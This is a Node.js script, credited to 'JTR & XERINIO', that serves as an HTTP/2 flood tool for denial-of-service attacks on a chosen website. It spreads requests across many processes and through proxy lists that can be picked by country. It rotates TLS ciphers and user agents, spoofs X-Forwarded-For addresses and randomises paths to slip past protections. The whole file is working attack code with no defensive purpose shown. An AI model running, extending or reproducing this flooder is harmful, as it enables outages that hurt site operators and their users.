process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const url = require('url');
const randstr = require('randomstring');
const syncRequest = require("sync-request");

var path = require("path");
const cluster = require('cluster');
const http2 = require('http2');

var fileName = __filename;
var file = path.basename(fileName);

let headerbuilders;
let COOKIES = undefined;
let POSTDATA = undefined;
var proxies = undefined;
var useragentparam = undefined;
var refererparam = undefined;
var useragentStatus = undefined;
var refererStatus = undefined;

if (process.argv.length < 8) {
    console.log('HTTP/2 bypass by JTR & XERINIO');
    console.log('node ' + file + ' <method> <host> <proxy> <sleep> <rate> <threads> (options cookie="" postdata="" randomstring="" headerdata="" useragent="" referer="")');
    //console.log(process.argv.length);
    process.exit(0);
}

let randomparam = false;

//geolocation

const country = ["AU", "BR", "CA", "CN", "DE", "FR", "GB", "HK", "ID", "IN", "IR", "IT", "JP", "KR", "NL", "PL", "RU", "SG", "TH", "TR", "TW", "US", "VN", "UA"]

if (country.includes(process.argv[4])) {
    proxies = fs.readFileSync(`${process.argv[4]}.txt`, 'utf-8').toString().replace(/\r/g, '').split('\n');
    console.log("Country selected: " + process.argv[4])
} else if (process.argv[4] == 1) {
    proxies = fs.readFileSync('proxy.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
    console.log('All proxies selected')
} else if (process.argv[4] == 2) {
    console.log('Dedicated proxies selected')
    proxies = fs.readFileSync('dc.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
} else if (process.argv[4] == 3) {
    proxies = fs.readFileSync('premium.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
    console.log('Premium proxies selected')
} else {
    proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
    console.log("Proxies loaded from file: " + process.argv[4])
}

var rate = process.argv[6];
var target_url = process.argv[3];
const target = target_url.split('""')[0];

process.argv.forEach((ss) => {
    if (ss.includes("cookie=") && !process.argv[2].split('""')[0].includes(ss)) {
        COOKIES = ss.slice(7);
    } else if (ss.includes("postdata=") && !process.argv[2].split('""')[0].includes(ss) && ss.length > 0) {
        POSTDATA = ss.slice(9);
    } else if (ss.includes("useragent=") && !process.argv[2].split('""')[0].includes(ss)) {
        useragentStatus = 1;
        useragentparam = ss.slice(10);
        console.log("(!) Custom UserAgent Mode: '" + useragentparam + "'");
    } else if (ss.includes("referer=") && !process.argv[2].split('""')[0].includes(ss)) {
        refererStatus = 1;
        refererparam = ss.slice(8);
        console.log("(!) Custom Referer Mode: '" + refererparam + "'");
    } else if (ss.includes("randomstring=")) {
        randomparam = ss.slice(13);
        console.log("(!) RandomString Mode");
    } else if (ss.includes("headerdata=")) {
        headerbuilders = {
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": 'document',
            "sec-fetch-site": 'none',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-user": '?1',
            "TE": 'trailers',
            "Pragma": 'no-cache',
            "upgrade-insecure-requests": 1,
            "Cache-Control": "max-age=0",
            // "Referer":target,
            "X-Forwarded-For": spoof(),
            "Cookie": COOKIES,
            ":method": "GET"
        };
        if (ss.slice(11).split('""')[0].includes("&")) {
            const hddata = ss.slice(11).split('""')[0].split("&");
            for (let i = 0; i < hddata.length; i++) {
                const head = hddata[i].split("=")[0];
                const dat = hddata[i].split("=")[1];
                headerbuilders[head] = dat;
            }
        } else {
            const hddata = ss.slice(11).split('""')[0];
            const head = hddata.split("=")[0];
            const dat = hddata.split("=")[1];
            headerbuilders[head] = dat;
        }
    }
});
if (COOKIES !== undefined) {
    console.log("(!) Custom Cookie Mode");
} else {
    COOKIES = "";
}
if (POSTDATA !== undefined) {
    console.log("(!) Custom PostData Mode");
} else {
    POSTDATA = "";
}
if (headerbuilders !== undefined) {
    console.log("(!) Custom HeaderData Mode");
    if (cluster.isMaster) {
        for (let i = 0; i < process.argv[7]; i++) {
            cluster.fork();
            console.log(`(!) Threads ${i} Started Attacking`);
        }
        console.log("http flood v1.0")

        setTimeout(() => {
            process.exit(1);
        }, process.argv[5] * 1000);
    } else {
        startflood();
    }
} else {
    headerbuilders = {
        "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        "accept-encoding": 'gzip, deflate, br',
        "accept-language": 'en-US,en;q=0.9',
        "sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"',
        "sec-ch-ua-mobile": '?0',
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": 'document',
        "sec-fetch-site": 'none',
        "sec-fetch-mode": 'navigate',
        "sec-fetch-user": '?1',
        "TE": 'trailers',
        "Pragma": 'no-cache',
        "upgrade-insecure-requests": 1,
        "Cache-Control": "max-age=0",
        // "Referer":target,
        "X-Forwarded-For": spoof(),
        "Cookie": COOKIES,
        ":method": "GET"
    }
    if (cluster.isMaster) {
        for (let i = 0; i < process.argv[7]; i++) {
            cluster.fork();
            console.log(`(!) Threads ${i} Started Attacking`);
        }
        console.log("http flood v1.0")

        setTimeout(() => {
            process.exit(1);
        }, process.argv[5] * 1000);
    } else {
        startflood();
    }
}

var parsed = url.parse(target);
process.setMaxListeners(0);

function ra() {
    const rsdat = randstr.generate({
        "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length": 4
    });
    return rsdat;
}

var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');

function spoof() {
    return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
}

const cplist = [
    "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

function startflood() {

    if (process.argv[2].toUpperCase() == "POST") {
        const tagpage = url.parse(target).path.replace("%RAND%", ra())
        headerbuilders[":method"] = "POST"
        headerbuilders["Content-Type"] = "text/plain"
        if (randomparam) {
            setInterval(() => {

                if (useragentStatus == 1) {
                    headerbuilders["User-agent"] = useragentparam
                } else {
                    headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
                }

                if (refererStatus == 1) {
                    headerbuilders["Referer"] = refererparam
                } else {
                    headerbuilders["Referer"] = target
                }

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];

                proxy = proxy.split(':');

                var http = require('http'),
                    tls = require('tls');

                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';

                var req = http.request({
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function(res, socket, head) {
                    //open raw request
                    const client = http2.connect(parsed.href, {
                        createConnection: () => tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLS_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            ALPNProtocols: ['h2'],
                            //sessionTimeout: 5000,
                            socket: socket
                        }, function() {
                            for (let i = 0; i < rate; i++) {
                                headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
                                headerbuilders["X-Forwarded-For"] = spoof();
                                headerbuilders["Body"] = `${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%",ra()) : POSTDATA}`
                                headerbuilders["Cookie"].replace("%RAND%", ra());
                                const req = client.request(headerbuilders);
                                req.end();
                                req.on("response", (headers) => {
                                    console.log(headers[':status']);
                                    req.close();
                                })
                            }
                        })
                    });
                });
                req.end();
            });
        } else {
            setInterval(() => {

                if (useragentStatus == 1) {
                    headerbuilders["User-agent"] = useragentparam
                } else {
                    headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
                }

                if (refererStatus == 1) {
                    headerbuilders["referer"] = refererparam
                } else {
                    headerbuilders["Referer"] = target
                }

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');

                var http = require('http'),
                    tls = require('tls');

                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';

                var req = http.request({
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function(res, socket, head) {
                    //open raw request
                    const client = http2.connect(parsed.href, {
                        createConnection: () => tls.connect({
                            host: `${(url.parse(target).path.includes("%RAND%")) ? tagpage : url.parse(target).path}`,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLS_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            ALPNProtocols: ['h2'],
                            //sessionTimeout: 5000,
                            socket: socket
                        }, function() {
                            for (let i = 0; i < rate; i++) {
                                headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
                                headerbuilders["X-Forwarded-For"] = spoof();
                                headerbuilders["Body"] = `${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%",ra()) : POSTDATA}`
                                headerbuilders["Cookie"].replace("%RAND%", ra());
                                const req = client.request(headerbuilders);
                                req.end();
                                req.on("response", (headers) => {
                                    console.log(headers[':status']);
                                    req.close();
                                })
                            }
                        })
                    });
                });
                req.end();
            });
        }
    } else if (process.argv[2].toUpperCase() == "GET") {
        headerbuilders[":method"] = "GET"
        if (randomparam) {
            setInterval(() => {

                if (useragentStatus == 1) {
                    headerbuilders["User-agent"] = useragentparam
                } else {
                    headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
                }

                if (refererStatus == 1) {
                    headerbuilders["Referer"] = refererparam
                } else {
                    headerbuilders["Referer"] = target
                }

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');

                var http = require('http'),
                    tls = require('tls');

                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';

                var req = http.request({
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function(res, socket, head) {
                    //open raw request
                    const client = http2.connect(parsed.href, {
                        createConnection: () => tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLS_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            ALPNProtocols: ['h2'],
                            //sessionTimeout: 5000,
                            socket: socket
                        }, function() {
                            for (let i = 0; i < rate; i++) {
                                headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
                                headerbuilders["X-Forwarded-For"] = spoof();
                                headerbuilders["Cookie"].replace("%RAND%", ra());
                                const req = client.request(headerbuilders);
                                req.end();
                                req.on("response", (headers) => {
                                    console.log(headers[':status']);
                                    req.close();
                                })
                            }
                        })
                    });
                });
                req.end();
            });
        } else {
            setInterval(() => {

                if (useragentStatus == 1) {
                    headerbuilders["User-agent"] = useragentparam
                } else {
                    headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
                }

                if (refererStatus == 1) {
                    headerbuilders["referer"] = refererparam
                } else {
                    headerbuilders["Referer"] = target
                }

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');

                var http = require('http'),
                    tls = require('tls');

                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';

                var req = http.request({
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function(res, socket, head) {
                    //open raw request
                    const client = http2.connect(parsed.href, {
                        createConnection: () => tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLS_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            ALPNProtocols: ['h2'],
                            //sessionTimeout: 5000,
                            socket: socket
                        }, function() {
                            for (let i = 0; i < rate; i++) {
                                headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
                                headerbuilders["X-Forwarded-For"] = spoof();
                                headerbuilders["Cookie"].replace("%RAND%", ra());
                                const req = client.request(headerbuilders);
                                req.end();
                                req.on("response", (headers) => {
                                    console.log(headers[':status']);
                                    req.close();
                                })
                            }
                        })
                    });
                });
                req.end();
            });
        }
    } else {
        console.log("(!) Method Invalid");
        process.exit(1);
    }

}
